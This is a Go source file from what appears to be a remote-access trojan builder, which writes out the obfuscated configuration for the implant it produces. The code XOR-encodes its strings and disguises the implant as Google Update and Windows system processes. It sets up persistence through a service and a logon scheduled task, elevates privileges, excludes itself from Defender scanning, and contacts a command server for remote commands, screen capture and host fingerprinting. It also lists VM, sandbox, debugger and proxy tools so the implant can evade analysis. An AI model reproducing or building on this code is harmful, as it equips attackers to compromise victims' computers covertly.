package buildergen

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

type globalValues struct {
	ForceAdmin          string
	AutorunMode         string
	HideFilesEnabled    bool
	InstallMode         string
	CustomInstallPath   string
	EncServerHost       string
	EncBuilderToken     string
	EncMutexName        string
	EncServiceName      string
	EncDisplayName      string
	EncServiceExeName   string
	EncWorkerExeName    string
	EncSchtasksExe      string
	EncSchtasksCreate   string
	EncSchtasksTn       string
	EncSchtasksTr       string
	EncSchtasksSc       string
	EncSchtasksOnLogon  string
	EncSchtasksRl       string
	EncSchtasksHighest  string
	EncSchtasksF        string
	EncSchtasksDelete   string
	EncProgramDataEnv   string
	EncWindowsUpdateDir string
	EncAppDataEnv       string
	EncMicrosoftDir     string
	EncWindowsDir       string
	EncAdvapi32Dll      string
	EncKernel32Dll      string
	EncOpenSCManagerW   string
	EncCreateServiceW   string
	EncCloseServiceHandle string
	EncOpenServiceW     string
	EncStartServiceW    string
	EncOpenProcessToken string
	EncGetTokenInformation string
	EncCloseHandle      string
	EncPowerShellExe    string
	EncPsStartProcessPrefix string
	EncPsRunasSuffix    string
	EncAddMpPref        string
	EncIsDebuggerPresent string
	EncWsScheme         string
	EncWsPath           string
	EncBuilderTokenHeader string
	EncOwnerName        string
	EncBuildID          string
	EncCmdPrefix        string
	EncBgPrefix         string
	EncCmdExe           string
	EncCmdCArg          string
	EncMsgBoxPrefix     string
	EncSwapMouseLeft    string
	EncSwapMouseRight   string
	EncShutdownExe      string
	EncShutdownRestart  string
	EncShutdownPoweroff string
	EncShutdownTimeout  string
	EncShutdownZero     string
	EncShakeOn          string
	EncShakeOff         string
	EncUser32Dll        string
	EncGetForegroundWindow string
	EncGetWindowTextW   string
	EncGetWindowTextLengthW string
	EncUnknownWindow    string
	EncNoActiveWindow   string
	EncUntitledWindow   string
	EncSystemParametersInfoW string
	EncBlockInputName   string
	EncMessageBoxW      string
	EncSetCursorPos     string
	EncBlockInputOnCmd  string
	EncBlockInputOffCmd string
	EncGetConsoleWindow string
	EncShowWindow       string
	EncGdi32Dll         string
	EncGetDesktopWindow string
	EncGetDC            string
	EncCreateCompatibleDC string
	EncCreateCompatibleBitmap string
	EncSelectObject     string
	EncBitBlt           string
	EncGetDeviceCaps    string
	EncDeleteDC         string
	EncReleaseDC        string
	EncDeleteObject     string
	EncGetDIBits        string
	EncHttpPrefix       string
	EncHttpsPrefix      string
	EncHttpsScheme      string
	EncSchemeSep        string
	EncBgImageName      string
	EncRemotePrefix     string
	EncExeSuffix        string
	EncCmdStart         string
	EncIpifyURL         string
	EncIpApiHost        string
	EncIpApiPath        string
	EncIpApiQuery       string
	EncCountryFallback  string
	EncWmic             string
	EncPsGetCpu         string
	EncWmicGetCpu       string
	EncPsGetGpu         string
	EncWmicGetGpu       string
	EncPsGetRam         string
	EncWmicGetRam       string
	EncPsGetOs          string
	EncWmicGetOs        string
	EncGetSystemPowerStatus string
	EncLinuxCpuCmd      string
	EncDarwinCpuCmd     string
	EncUnknownCPU       string
	EncUnknownGPU       string
	EncUnknownRAM       string
	EncUnknownOS        string
	EncLaptopLabel      string
	EncDesktopLabel     string
	EncShCmd            string
	EncDashCArg         string
	EncSysctlCmd        string
	EncSysctlNameArg    string
	EncXdgOpen          string
	EncDisguisedExeName string
	EncDisguiseDir      string
	EncLocalAppDataEnv  string
	EncVmProcesses      string
	EncSandboxProcs     string
	EncVmFiles          string
	EncSandboxUsers     string
	EncSandboxHosts     string
	EncVmMacPrefixes    string
	EncMitmProcs        string
	EncMitmIssuers      string
	EncVmRegPaths       string
	EncGlobalMemoryStatusEx    string
	EncGetDiskFreeSpaceExW     string
	EncGetTickCount64          string
	EncRegOpenKeyExW           string
	EncRegCloseKey             string
	EncGetSystemMetrics        string
	EncCreateToolhelp32Snapshot string
	EncProcess32FirstW         string
	EncProcess32NextW          string
	EncCrypt32Dll              string
	EncCertOpenSystemStoreW    string
	EncCertEnumCerts           string
	EncCertGetNameStringW      string
	EncCertFreeCertCtx         string
	EncCertCloseStore          string
	AntiAnalysisMode    string
	OfflineMode         bool
	XorKeyLiteral       string
}

var disguiseNames = []string{
	"RuntimeBroker.exe",
	"SearchHost.exe",
	"SecurityHealthSystray.exe",
	"TextInputHost.exe",
	"ShellExperienceHost.exe",
	"ApplicationFrameHost.exe",
	"SystemSettings.exe",
	"UserOOBEBroker.exe",
}

var disguiseDirs = []string{
	"WindowsApps",
	"SystemAppData",
	"CloudStore",
	"IdentityService",
}

func pickDisguiseName() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	return disguiseNames[r.Intn(len(disguiseNames))]
}

func pickDisguiseDir() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	return disguiseDirs[r.Intn(len(disguiseDirs))]
}

func buildGlobals(cfg Config) (globalValues, error) {
	safeBuildID := strings.TrimSpace(cfg.BuildID)
	safeBuildID = sanitizeBuildID(safeBuildID)
	key := generateXorKey()

	svcName := "GoogleUpdateAgent"
	displayName := "Google Update Agent"
	svcExeName := "GoogleUpdate.exe"
	workerExeName := "Google Chrome.exe"
	mutexName := fmt.Sprintf("Global\\\\NvDisplayMutex_%s", safeBuildID)

	encServerHost := xorWithKey(cfg.ServerHost, key)
	encBuilderToken := xorWithKey(cfg.BuilderToken, key)

	return globalValues{
		ForceAdmin:        strings.TrimSpace(cfg.ForceAdmin),
		AutorunMode:       strings.TrimSpace(cfg.AutorunMode),
		HideFilesEnabled:  cfg.HideFilesEnabled,
		InstallMode:       strings.TrimSpace(cfg.InstallMode),
		CustomInstallPath: escapeGoString(cfg.CustomInstallPath),
		EncServerHost:     encServerHost,
		EncBuilderToken:   encBuilderToken,
		EncMutexName:      xorWithKey(mutexName, key),
		EncServiceName:    xorWithKey(svcName, key),
		EncDisplayName:    xorWithKey(displayName, key),
		EncServiceExeName: xorWithKey(svcExeName, key),
		EncWorkerExeName:  xorWithKey(workerExeName, key),
		EncSchtasksExe:    xorWithKey("schtasks", key),
		EncSchtasksCreate: xorWithKey("/Create", key),
		EncSchtasksTn:     xorWithKey("/TN", key),
		EncSchtasksTr:     xorWithKey("/TR", key),
		EncSchtasksSc:     xorWithKey("/SC", key),
		EncSchtasksOnLogon: xorWithKey("ONLOGON", key),
		EncSchtasksRl:     xorWithKey("/RL", key),
		EncSchtasksHighest: xorWithKey("HIGHEST", key),
		EncSchtasksF:      xorWithKey("/F", key),
		EncSchtasksDelete: xorWithKey("/Delete", key),
		EncProgramDataEnv: xorWithKey("ProgramData", key),
		EncWindowsUpdateDir: xorWithKey("GoogleUpdate", key),
		EncAppDataEnv:     xorWithKey("APPDATA", key),
		EncMicrosoftDir:   xorWithKey("Microsoft", key),
		EncWindowsDir:     xorWithKey("Windows", key),
		EncAdvapi32Dll:    xorWithKey("advapi32.dll", key),
		EncKernel32Dll:    xorWithKey("kernel32.dll", key),
		EncOpenSCManagerW: xorWithKey("OpenSCManagerW", key),
		EncCreateServiceW: xorWithKey("CreateServiceW", key),
		EncCloseServiceHandle: xorWithKey("CloseServiceHandle", key),
		EncOpenServiceW:   xorWithKey("OpenServiceW", key),
		EncStartServiceW:  xorWithKey("StartServiceW", key),
		EncOpenProcessToken: xorWithKey("OpenProcessToken", key),
		EncGetTokenInformation: xorWithKey("GetTokenInformation", key),
		EncCloseHandle:    xorWithKey("CloseHandle", key),
		EncPowerShellExe:  xorWithKey("powershell", key),
		EncPsStartProcessPrefix: xorWithKey("Start-Process -FilePath '", key),
		EncPsRunasSuffix:  xorWithKey("' -Verb runas", key),
		EncAddMpPref:      xorWithKey("Add-MpPreference -ExclusionPath", key),
		EncIsDebuggerPresent: xorWithKey("IsDebuggerPresent", key),
		EncWsScheme:       xorWithKey(strings.TrimSpace(cfg.WSScheme), key),
		EncWsPath:         xorWithKey("/ws", key),
		EncBuilderTokenHeader: xorWithKey("X-Builder-Token", key),
		EncOwnerName:      xorWithKey(strings.TrimSpace(cfg.Owner), key),
		EncBuildID:        xorWithKey(strings.TrimSpace(cfg.BuildID), key),
		EncCmdPrefix:      xorWithKey("cmd:", key),
		EncBgPrefix:       xorWithKey("bg:", key),
		EncCmdExe:         xorWithKey("cmd", key),
		EncCmdCArg:        xorWithKey("/C", key),
		EncMsgBoxPrefix:   xorWithKey("msgbox|", key),
		EncSwapMouseLeft:  xorWithKey("swap_mouse_left_right", key),
		EncSwapMouseRight: xorWithKey("swap_mouse_right_left", key),
		EncShutdownExe:    xorWithKey("shutdown", key),
		EncShutdownRestart: xorWithKey("/r", key),
		EncShutdownPoweroff: xorWithKey("/s", key),
		EncShutdownTimeout: xorWithKey("/t", key),
		EncShutdownZero:   xorWithKey("0", key),
		EncShakeOn:        xorWithKey("shake_on", key),
		EncShakeOff:       xorWithKey("shake_off", key),
		EncUser32Dll:      xorWithKey("user32.dll", key),
		EncGetForegroundWindow: xorWithKey("GetForegroundWindow", key),
		EncGetWindowTextW: xorWithKey("GetWindowTextW", key),
		EncGetWindowTextLengthW: xorWithKey("GetWindowTextLengthW", key),
		EncUnknownWindow:  xorWithKey("Unknown", key),
		EncNoActiveWindow: xorWithKey("No active window", key),
		EncUntitledWindow: xorWithKey("Untitled", key),
		EncSystemParametersInfoW: xorWithKey("SystemParametersInfoW", key),
		EncBlockInputName: xorWithKey("BlockInput", key),
		EncMessageBoxW:    xorWithKey("MessageBoxW", key),
		EncSetCursorPos:   xorWithKey("SetCursorPos", key),
		EncBlockInputOnCmd: xorWithKey("block_input_on", key),
		EncBlockInputOffCmd: xorWithKey("block_input_off", key),
		EncGetConsoleWindow: xorWithKey("GetConsoleWindow", key),
		EncShowWindow:     xorWithKey("ShowWindow", key),
		EncGdi32Dll:       xorWithKey("gdi32.dll", key),
		EncGetDesktopWindow: xorWithKey("GetDesktopWindow", key),
		EncGetDC:          xorWithKey("GetDC", key),
		EncCreateCompatibleDC: xorWithKey("CreateCompatibleDC", key),
		EncCreateCompatibleBitmap: xorWithKey("CreateCompatibleBitmap", key),
		EncSelectObject:   xorWithKey("SelectObject", key),
		EncBitBlt:         xorWithKey("BitBlt", key),
		EncGetDeviceCaps:  xorWithKey("GetDeviceCaps", key),
		EncDeleteDC:       xorWithKey("DeleteDC", key),
		EncReleaseDC:      xorWithKey("ReleaseDC", key),
		EncDeleteObject:   xorWithKey("DeleteObject", key),
		EncGetDIBits:      xorWithKey("GetDIBits", key),
		EncHttpPrefix:     xorWithKey("http://", key),
		EncHttpsPrefix:    xorWithKey("https://", key),
		EncHttpsScheme:    xorWithKey("https", key),
		EncSchemeSep:      xorWithKey("://", key),
		EncBgImageName:    xorWithKey("bg_image.jpg", key),
		EncRemotePrefix:   xorWithKey("/remote/", key),
		EncExeSuffix:      xorWithKey(".exe", key),
		EncCmdStart:       xorWithKey("start", key),
		EncIpifyURL:       xorWithKey("https://api.ipify.org", key),
		EncIpApiHost:      xorWithKey("ip-api.com", key),
		EncIpApiPath:      xorWithKey("/json/", key),
		EncIpApiQuery:     xorWithKey("?fields=countryCode", key),
		EncCountryFallback: xorWithKey("RU", key),
		EncWmic:           xorWithKey("wmic", key),
		EncPsGetCpu:       xorWithKey("(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name) -join ','", key),
		EncWmicGetCpu:     xorWithKey("cpu get name", key),
		EncPsGetGpu:       xorWithKey("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name", key),
		EncWmicGetGpu:     xorWithKey("path win32_VideoController get name", key),
		EncPsGetRam:       xorWithKey("(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum", key),
		EncWmicGetRam:     xorWithKey("computersystem get TotalPhysicalMemory", key),
		EncPsGetOs:        xorWithKey("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').ProductName", key),
		EncWmicGetOs:      xorWithKey("os get Caption", key),
		EncGetSystemPowerStatus: xorWithKey("GetSystemPowerStatus", key),
		EncLinuxCpuCmd:    xorWithKey("lscpu | grep 'Model name' | cut -d':' -f2 | xargs", key),
		EncDarwinCpuCmd:   xorWithKey("machdep.cpu.brand_string", key),
		EncUnknownCPU:     xorWithKey("Unknown CPU", key),
		EncUnknownGPU:     xorWithKey("Unknown GPU", key),
		EncUnknownRAM:     xorWithKey("Unknown RAM", key),
		EncUnknownOS:      xorWithKey("Unknown OS", key),
		EncLaptopLabel:    xorWithKey("laptop", key),
		EncDesktopLabel:   xorWithKey("desktop", key),
		EncShCmd:          xorWithKey("sh", key),
		EncDashCArg:       xorWithKey("-c", key),
		EncSysctlCmd:      xorWithKey("sysctl", key),
		EncSysctlNameArg:  xorWithKey("-n", key),
		EncXdgOpen:        xorWithKey("xdg-open", key),
		EncDisguisedExeName: xorWithKey(pickDisguiseName(), key),
		EncDisguiseDir:      xorWithKey(pickDisguiseDir(), key),
		EncLocalAppDataEnv:  xorWithKey("LOCALAPPDATA", key),
		EncVmProcesses: xorListWithKey([]string{
			"VBoxService.exe", "VBoxTray.exe", "vmtoolsd.exe", "VMwareTray.exe",
			"VMwareUser.exe", "vmware.exe", "vmware-vmx.exe", "prl_tools.exe",
			"prl_cc.exe", "qemu-ga.exe", "vmsrvc.exe", "vboxservice.exe",
			"vboxtray.exe", "xenservice.exe", "joeboxcontrol.exe", "joeboxserver.exe",
			"cuckoomon.exe", "cuckoo.exe", "prl_tools_service.exe", "vdagent.exe", "vdservice.exe", "windanr.exe",
		}, key),
		EncSandboxProcs: xorListWithKey([]string{
			"SandboxieRpcSs.exe", "SandboxieDcomLaunch.exe", "SbieSvc.exe",
			"procmon.exe", "procmon64.exe", "wireshark.exe", "fiddler.exe",
			"ollydbg.exe", "idaq.exe", "idaq64.exe", "x64dbg.exe", "x32dbg.exe",
			"windbg.exe", "dnSpy.exe", "de4dot.exe", "ilspy.exe",
			"dotPeek32.exe", "dotPeek64.exe", "pestudio.exe", "processhacker.exe",
			"autoruns.exe", "autorunsc.exe", "regmon.exe", "filemon.exe",
			"tcpview.exe", "Rachael.exe", "DVTAP.exe", "analyzer.exe",
		}, key),
		EncVmFiles: xorListWithKey([]string{
			`C:\Windows\System32\VBox*.dll`, `C:\Windows\System32\VBoxHook.dll`,
			`C:\Windows\System32\VBoxGuest.sys`, `C:\Windows\System32\VBoxMouse.sys`,
			`C:\Windows\System32\VBoxSF.sys`, `C:\Windows\System32\vmGuestLib.dll`,
			`C:\Windows\System32\vm3dgl.dll`,
			`C:\Program Files\VMware\VMware Tools\vmtoolsd.exe`,
			`C:\Program Files\Oracle\VirtualBox\VBoxService.exe`,
			`C:\Windows\System32\drivers\vmmouse.sys`, `C:\Windows\System32\drivers\vmhgfs.sys`,
			`C:\Windows\System32\drivers\VBoxGuest.sys`, `C:\Windows\System32\drivers\VBoxMouse.sys`,
			`C:\Windows\System32\drivers\VBoxSF.sys`, `C:\Windows\System32\drivers\VBoxVideo.sys`,
		}, key),
		EncSandboxUsers: xorListWithKey([]string{
			"sandbox", "virus", "malware", "maltest", "test", "john", "user",
			"currentuser", "sand box", "tester", "cuckoo", "vmware",
			"vbox", "qemu", "analysis", "sample", "default", "infected", "pc",
		}, key),
		EncSandboxHosts: xorListWithKey([]string{
			"sandbox", "malware", "virus", "analysis", "sample", "cuckoo", "testpc", "desktop-",
		}, key),
		EncVmMacPrefixes: xorListWithKey([]string{
			"00:05:69", "00:0c:29", "00:1c:14", "00:50:56",
			"08:00:27", "00:1c:42", "52:54:00", "00:16:3e",
			"00:03:ff", "02:42:ac",
		}, key),
		EncMitmProcs: xorListWithKey([]string{
			"Fiddler.exe", "FiddlerEverywhere.exe", "Charles.exe", "BurpSuite.exe",
			"burp.exe", "mitmproxy.exe", "Proxifier.exe", "HTTPDebuggerUI.exe",
			"HTTPDebuggerSvc.exe", "sslsplit.exe", "sslproxy.exe", "zap.exe",
			"OWASPZAP.exe", "SmartSniff.exe", "HttpAnalyzerStd.exe", "RawCap.exe",
			"NetworkMiner.exe", "GlassWire.exe", "Tcpdump.exe", "PacketCapture.exe", "NetworkMonitor.exe",
		}, key),
		EncMitmIssuers: xorListWithKey([]string{
			"fiddler", "charles", "burp", "mitmproxy", "portswigger",
			"owasp", "zap proxy", "do_not_trust", "insecure",
		}, key),
		EncVmRegPaths: xorListWithKey([]string{
			"0x80000002|SOFTWARE\\VMware, Inc.\\VMware Tools",
			"0x80000002|SOFTWARE\\Oracle\\VirtualBox Guest Additions",
			"0x80000001|SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxService",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmci",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\vmmouse",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VMTools",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL",
			"0x80000002|SYSTEM\\CurrentControlSet\\Services\\Xen*",
		}, key),
		EncGlobalMemoryStatusEx:     xorWithKey("GlobalMemoryStatusEx", key),
		EncGetDiskFreeSpaceExW:      xorWithKey("GetDiskFreeSpaceExW", key),
		EncGetTickCount64:           xorWithKey("GetTickCount64", key),
		EncRegOpenKeyExW:            xorWithKey("RegOpenKeyExW", key),
		EncRegCloseKey:              xorWithKey("RegCloseKey", key),
		EncGetSystemMetrics:         xorWithKey("GetSystemMetrics", key),
		EncCreateToolhelp32Snapshot: xorWithKey("CreateToolhelp32Snapshot", key),
		EncProcess32FirstW:          xorWithKey("Process32FirstW", key),
		EncProcess32NextW:           xorWithKey("Process32NextW", key),
		EncCrypt32Dll:               xorWithKey("crypt32.dll", key),
		EncCertOpenSystemStoreW:     xorWithKey("CertOpenSystemStoreW", key),
		EncCertEnumCerts:            xorWithKey("CertEnumCertificatesInStore", key),
		EncCertGetNameStringW:       xorWithKey("CertGetNameStringW", key),
		EncCertFreeCertCtx:          xorWithKey("CertFreeCertificateContext", key),
		EncCertCloseStore:           xorWithKey("CertCloseStore", key),
		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
		OfflineMode:       cfg.OfflineMode,
		XorKeyLiteral:     escapeGoString(key),
	}, nil
}

func templateGlobals(cfg Config) (string, error) {
	g, err := buildGlobals(cfg)

	if err != nil {
		return "", err
	}

	goHideFiles := "false"
	if g.HideFilesEnabled {
		goHideFiles = "true"
	}

	goOfflineMode := "false"
	if g.OfflineMode {
		goOfflineMode = "true"
	}

	return strings.TrimSpace(fmt.Sprintf(`
var forceAdminMode = "%s"
var autorunMode = "%s"
var hideFilesEnabled = %s
var installMode = "%s"
var customInstallPath = "%s"
var antiAnalysisMode = "%s"
var offlineModeEnabled = %s

var encServerHost = []byte{%s}
var encServiceName = []byte{%s}
var encDisplayName = []byte{%s}
var encServiceExeName = []byte{%s}
var encWorkerExeName = []byte{%s}
var encMutexName = []byte{%s}
var encBuilderToken = []byte{%s}
var encSchtasksExe = []byte{%s}
var encSchtasksCreate = []byte{%s}
var encSchtasksTn = []byte{%s}
var encSchtasksTr = []byte{%s}
var encSchtasksSc = []byte{%s}
var encSchtasksOnLogon = []byte{%s}
var encSchtasksRl = []byte{%s}
var encSchtasksHighest = []byte{%s}
var encSchtasksF = []byte{%s}
var encSchtasksDelete = []byte{%s}
var encProgramDataEnv = []byte{%s}
var encWindowsUpdateDir = []byte{%s}
var encAppDataEnv = []byte{%s}
var encMicrosoftDir = []byte{%s}
var encWindowsDir = []byte{%s}
var encAdvapi32Dll = []byte{%s}
var encKernel32Dll = []byte{%s}
var encOpenSCManagerWName = []byte{%s}
var encCreateServiceWName = []byte{%s}
var encCloseServiceHandleName = []byte{%s}
var encOpenServiceWName = []byte{%s}
var encStartServiceWName = []byte{%s}
var encOpenProcessTokenName = []byte{%s}
var encGetTokenInformationName = []byte{%s}
var encCloseHandleName = []byte{%s}
var encPowerShellExe = []byte{%s}
var encPsStartProcessPrefix = []byte{%s}
var encPsRunasSuffix = []byte{%s}
var encAddMpPref = []byte{%s}
var encIsDebuggerPresent = []byte{%s}
var encWsScheme = []byte{%s}
var encWsPath = []byte{%s}
var encBuilderTokenHeader = []byte{%s}
var encOwnerName = []byte{%s}
var encBuildID = []byte{%s}
var encCmdPrefix = []byte{%s}
var encBgPrefix = []byte{%s}
var encCmdExe = []byte{%s}
var encCmdCArg = []byte{%s}
var encMsgBoxPrefix = []byte{%s}
var encSwapMouseLeft = []byte{%s}
var encSwapMouseRight = []byte{%s}
var encShutdownExe = []byte{%s}
var encShutdownRestart = []byte{%s}
var encShutdownPoweroff = []byte{%s}
var encShutdownTimeout = []byte{%s}
var encShutdownZero = []byte{%s}
var encShakeOn = []byte{%s}
var encShakeOff = []byte{%s}
var encUser32Dll = []byte{%s}
var encGetForegroundWindowName = []byte{%s}
var encGetWindowTextWName = []byte{%s}
var encGetWindowTextLengthWName = []byte{%s}
var encUnknownWindow = []byte{%s}
var encNoActiveWindow = []byte{%s}
var encUntitledWindow = []byte{%s}
var encSystemParametersInfoWName = []byte{%s}
var encBlockInputName = []byte{%s}
var encMessageBoxWName = []byte{%s}
var encSetCursorPosName = []byte{%s}
var encBlockInputOnCmd = []byte{%s}
var encBlockInputOffCmd = []byte{%s}
var encGetConsoleWindowName = []byte{%s}
var encShowWindowName = []byte{%s}
var encGdi32Dll = []byte{%s}
var encGetDesktopWindowName = []byte{%s}
var encGetDCName = []byte{%s}
var encCreateCompatibleDCName = []byte{%s}
var encCreateCompatibleBitmapName = []byte{%s}
var encSelectObjectName = []byte{%s}
var encBitBltName = []byte{%s}
var encGetDeviceCapsName = []byte{%s}
var encDeleteDCName = []byte{%s}
var encReleaseDCName = []byte{%s}
var encDeleteObjectName = []byte{%s}
var encGetDIBitsName = []byte{%s}
var encHttpPrefix = []byte{%s}
var encHttpsPrefix = []byte{%s}
var encHttpsScheme = []byte{%s}
var encSchemeSep = []byte{%s}
var encBgImageName = []byte{%s}
var encRemotePrefix = []byte{%s}
var encExeSuffix = []byte{%s}
var encCmdStart = []byte{%s}
var encIpifyURL = []byte{%s}
var encIpApiHost = []byte{%s}
var encIpApiPath = []byte{%s}
var encIpApiQuery = []byte{%s}
var encCountryFallback = []byte{%s}
var encWmic = []byte{%s}
var encPsGetCpu = []byte{%s}
var encWmicGetCpu = []byte{%s}
var encPsGetGpu = []byte{%s}
var encWmicGetGpu = []byte{%s}
var encPsGetRam = []byte{%s}
var encWmicGetRam = []byte{%s}
var encPsGetOs = []byte{%s}
var encWmicGetOs = []byte{%s}
var encGetSystemPowerStatusName = []byte{%s}
var encLinuxCpuCmd = []byte{%s}
var encDarwinCpuCmd = []byte{%s}
var encUnknownCPU = []byte{%s}
var encUnknownGPU = []byte{%s}
var encUnknownRAM = []byte{%s}
var encUnknownOS = []byte{%s}
var encLaptopLabel = []byte{%s}
var encDesktopLabel = []byte{%s}
var encShCmd = []byte{%s}
var encDashCArg = []byte{%s}
var encSysctlCmd = []byte{%s}
var encSysctlNameArg = []byte{%s}
var encXdgOpen = []byte{%s}
var encDisguisedExeName = []byte{%s}
var encDisguiseDir = []byte{%s}
var encLocalAppDataEnv = []byte{%s}
var encVmProcesses = []byte{%s}
var encSandboxProcs = []byte{%s}
var encVmFiles = []byte{%s}
var encSandboxUsers = []byte{%s}
var encSandboxHosts = []byte{%s}
var encVmMacPrefixes = []byte{%s}
var encMitmProcs = []byte{%s}
var encMitmIssuers = []byte{%s}
var encVmRegPaths = []byte{%s}
var encGlobalMemoryStatusExName = []byte{%s}
var encGetDiskFreeSpaceExWName = []byte{%s}
var encGetTickCount64Name = []byte{%s}
var encRegOpenKeyExWName = []byte{%s}
var encRegCloseKeyName = []byte{%s}
var encGetSystemMetricsName = []byte{%s}
var encCreateToolhelp32SnapshotName = []byte{%s}
var encProcess32FirstWName = []byte{%s}
var encProcess32NextWName = []byte{%s}
var encCrypt32Dll = []byte{%s}
var encCertOpenSystemStoreWName = []byte{%s}
var encCertEnumCertsName = []byte{%s}
var encCertGetNameStringWName = []byte{%s}
var encCertFreeCertCtxName = []byte{%s}
var encCertCloseStoreName = []byte{%s}

var decryptionKey = []byte("%s")
`,
		escapeGoString(g.ForceAdmin),
		escapeGoString(g.AutorunMode),
		goHideFiles,
		escapeGoString(g.InstallMode),
		g.CustomInstallPath,
		escapeGoString(g.AntiAnalysisMode),
		goOfflineMode,

		g.EncServerHost,
		g.EncServiceName,
		g.EncDisplayName,
		g.EncServiceExeName,
		g.EncWorkerExeName,
		g.EncMutexName,
		g.EncBuilderToken,
		g.EncSchtasksExe,
		g.EncSchtasksCreate,
		g.EncSchtasksTn,
		g.EncSchtasksTr,
		g.EncSchtasksSc,
		g.EncSchtasksOnLogon,
		g.EncSchtasksRl,
		g.EncSchtasksHighest,
		g.EncSchtasksF,
		g.EncSchtasksDelete,
		g.EncProgramDataEnv,
		g.EncWindowsUpdateDir,
		g.EncAppDataEnv,
		g.EncMicrosoftDir,
		g.EncWindowsDir,
		g.EncAdvapi32Dll,
		g.EncKernel32Dll,
		g.EncOpenSCManagerW,
		g.EncCreateServiceW,
		g.EncCloseServiceHandle,
		g.EncOpenServiceW,
		g.EncStartServiceW,
		g.EncOpenProcessToken,
		g.EncGetTokenInformation,
		g.EncCloseHandle,
		g.EncPowerShellExe,
		g.EncPsStartProcessPrefix,
		g.EncPsRunasSuffix,
		g.EncAddMpPref,
		g.EncIsDebuggerPresent,
		g.EncWsScheme,
		g.EncWsPath,
		g.EncBuilderTokenHeader,
		g.EncOwnerName,
		g.EncBuildID,
		g.EncCmdPrefix,
		g.EncBgPrefix,
		g.EncCmdExe,
		g.EncCmdCArg,
		g.EncMsgBoxPrefix,
		g.EncSwapMouseLeft,
		g.EncSwapMouseRight,
		g.EncShutdownExe,
		g.EncShutdownRestart,
		g.EncShutdownPoweroff,
		g.EncShutdownTimeout,
		g.EncShutdownZero,
		g.EncShakeOn,
		g.EncShakeOff,
		g.EncUser32Dll,
		g.EncGetForegroundWindow,
		g.EncGetWindowTextW,
		g.EncGetWindowTextLengthW,
		g.EncUnknownWindow,
		g.EncNoActiveWindow,
		g.EncUntitledWindow,
		g.EncSystemParametersInfoW,
		g.EncBlockInputName,
		g.EncMessageBoxW,
		g.EncSetCursorPos,
		g.EncBlockInputOnCmd,
		g.EncBlockInputOffCmd,
		g.EncGetConsoleWindow,
		g.EncShowWindow,
		g.EncGdi32Dll,
		g.EncGetDesktopWindow,
		g.EncGetDC,
		g.EncCreateCompatibleDC,
		g.EncCreateCompatibleBitmap,
		g.EncSelectObject,
		g.EncBitBlt,
		g.EncGetDeviceCaps,
		g.EncDeleteDC,
		g.EncReleaseDC,
		g.EncDeleteObject,
		g.EncGetDIBits,
		g.EncHttpPrefix,
		g.EncHttpsPrefix,
		g.EncHttpsScheme,
		g.EncSchemeSep,
		g.EncBgImageName,
		g.EncRemotePrefix,
		g.EncExeSuffix,
		g.EncCmdStart,
		g.EncIpifyURL,
		g.EncIpApiHost,
		g.EncIpApiPath,
		g.EncIpApiQuery,
		g.EncCountryFallback,
		g.EncWmic,
		g.EncPsGetCpu,
		g.EncWmicGetCpu,
		g.EncPsGetGpu,
		g.EncWmicGetGpu,
		g.EncPsGetRam,
		g.EncWmicGetRam,
		g.EncPsGetOs,
		g.EncWmicGetOs,
		g.EncGetSystemPowerStatus,
		g.EncLinuxCpuCmd,
		g.EncDarwinCpuCmd,
		g.EncUnknownCPU,
		g.EncUnknownGPU,
		g.EncUnknownRAM,
		g.EncUnknownOS,
		g.EncLaptopLabel,
		g.EncDesktopLabel,
		g.EncShCmd,
		g.EncDashCArg,
		g.EncSysctlCmd,
		g.EncSysctlNameArg,
		g.EncXdgOpen,
		g.EncDisguisedExeName,
		g.EncDisguiseDir,
		g.EncLocalAppDataEnv,
		g.EncVmProcesses,
		g.EncSandboxProcs,
		g.EncVmFiles,
		g.EncSandboxUsers,
		g.EncSandboxHosts,
		g.EncVmMacPrefixes,
		g.EncMitmProcs,
		g.EncMitmIssuers,
		g.EncVmRegPaths,
		g.EncGlobalMemoryStatusEx,
		g.EncGetDiskFreeSpaceExW,
		g.EncGetTickCount64,
		g.EncRegOpenKeyExW,
		g.EncRegCloseKey,
		g.EncGetSystemMetrics,
		g.EncCreateToolhelp32Snapshot,
		g.EncProcess32FirstW,
		g.EncProcess32NextW,
		g.EncCrypt32Dll,
		g.EncCertOpenSystemStoreW,
		g.EncCertEnumCerts,
		g.EncCertGetNameStringW,
		g.EncCertFreeCertCtx,
		g.EncCertCloseStore,
		g.XorKeyLiteral,
	)), nil
}

func sanitizeBuildID(buildID string) string {
	if buildID == "" {
		return ""
	}
	var out strings.Builder
	for i := 0; i < len(buildID) && out.Len() < 10; i++ {
		ch := buildID[i]
		if (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') {
			out.WriteByte(ch)
		}
	}
	return out.String()
}